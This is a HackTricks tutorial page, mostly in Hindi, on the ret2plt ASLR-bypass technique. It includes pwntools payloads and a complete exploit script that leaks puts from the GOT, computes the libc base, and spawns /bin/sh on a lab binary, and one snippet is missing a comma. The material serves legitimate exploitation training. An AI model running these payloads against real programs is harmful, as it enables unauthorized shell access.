# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

इस तकनीक का उद्देश्य होगा **PLT के किसी फ़ंक्शन से एक पता leak करना** ताकि ASLR को बायपास किया जा सके। यह इसलिए है क्योंकि, उदाहरण के लिए, अगर आप libc के फ़ंक्शन `puts` का पता leak करते हैं, तो आप इसके बाद **`libc` का बेस कहाँ है यह calculate कर सकते हैं** और अन्य फ़ंक्शन्स जैसे **`system`** तक पहुँचने के लिए ऑफ़सेट्स की गणना कर सकते हैं।

यह `pwntools` payload जैसे ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)) के साथ किया जा सकता है:
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
ध्यान दें कि **`puts`** (PLT से मिले पते का उपयोग करते हुए) को उस पते के साथ कॉल किया जाता है जो GOT (Global Offset Table) में `puts` का स्थान रखता है। इसका कारण यह है कि जब `puts` GOT में `puts` की एंट्री को प्रिंट करेगा, तब यह एंट्री मेमोरी में `puts` का सटीक पता रखेगी।

साथ ही ध्यान दें कि exploit में `main` का पता इसलिए उपयोग किया गया है ताकि जब `puts` अपनी execution समाप्त कर दे, तो binary exit होने के बजाय `main` को फिर से कॉल करे (इससे leaked पता वैध बना रहेगा)।

> [!CAUTION]
> ध्यान दें कि इसके काम करने के लिए **binary को PIE के साथ compile नहीं किया जा सकता** या आपको PLT, GOT और `main` का पता जानने के लिए **PIE को bypass करने के लिए कोई leak मिली होनी चाहिए**। अन्यथा, पहले आपको PIE को bypass करना होगा।

आप इसे [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass) पर पा सकते हैं। यह उस **उदाहरण** का अंतिम exploit था:

<details>
<summary>पूर्ण exploit उदाहरण (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Modern considerations

- **`-fno-plt` builds** (आधुनिक distros में सामान्य) `call foo@plt` को `call [foo@got]` से बदल देते हैं। अगर बाइनरी में कोई `foo@plt` स्टब नहीं है, तो आप अभी भी `puts(elf.got['foo'])` के साथ resolved address को leak कर सकते हैं और फिर **सीधे GOT एंट्री पर रिटर्न करें** (`flat(padding, elf.got['foo'])`) ताकि lazy binding पूरा होने के बाद libc में जंप हो सके।
- **Full RELRO / `-Wl,-z,now`**: GOT read‑only होता है लेकिन ret2plt अभी भी leaks के लिए काम करता है क्योंकि आप केवल GOT slot पढ़ते हैं। अगर symbol कभी कॉल नहीं हुआ है, तो आपका पहला ret2plt lazy binding भी करेगा और फिर resolved slot को print करेगा।
- **ASLR + PIE**: अगर PIE enabled है, पहले एक code pointer leak करें (जैसे saved return address, function pointer, या `.plt` entry किसी दूसरे format‑string/infoleak के जरिए) ताकि PIE base का हिसाब लगाया जा सके, फिर rebased PLT/GOT addresses के साथ ret2plt chain बनाएं।
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries valid BTI landing pads (`bti c`) होते हैं, इसलिए BTI‑enabled binaries पर exploit करते समय सीधे बिना BTI वाले libc gadget में कूदने की बजाय PLT stub (या किसी अन्य BTI‑annotated gadget) में कूदना पसंद करें, वरना CPU `BRK`/`PAC` failures फेंकेगा।
- **Quick resolution helper**: अगर target function अभी तक resolved नहीं हुआ है और आपको एक ही शॉट में leak चाहिए, तो PLT call को दो बार chain करें: पहले `elf.plt['foo']` (to resolve) फिर फिर से `elf.plt['foo']` GOT address को argument के रूप में देकर अब भरे हुए slot को print करने के लिए।

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, पहला कदम overflow को भरना है जब तक canary के 0x00 बाइट तक न पहुँच जाए ताकि फिर puts को कॉल करके उसे leak किया जा सके। Canary मिलने के बाद एक ROP gadget बनाया जाता है जो puts को कॉल करके GOT से puts का address leak करता है और फिर एक ROP gadget जो `system('/bin/sh')` को कॉल करता है।
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, main में child function से stack overflow। ROP gadget puts को कॉल करके GOT से puts का address leak करने के लिए और फिर एक one gadget को कॉल करने के लिए।

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
